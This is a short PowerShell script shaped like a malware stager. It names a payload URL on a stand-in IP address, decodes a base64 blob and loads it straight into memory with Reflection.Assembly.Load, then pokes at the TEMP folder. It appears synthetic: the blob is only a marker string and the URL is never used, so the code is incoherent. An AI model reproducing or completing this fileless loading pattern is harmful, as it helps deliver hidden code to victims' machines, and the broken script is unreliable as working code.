
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.146/payload.bin",
    [int]$TimeoutSec = 153
)
$ErrorActionPreference = "Stop"

$StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjoyN3NtaWk1eG9l")
Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($StageBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Location -Path $env:TEMP
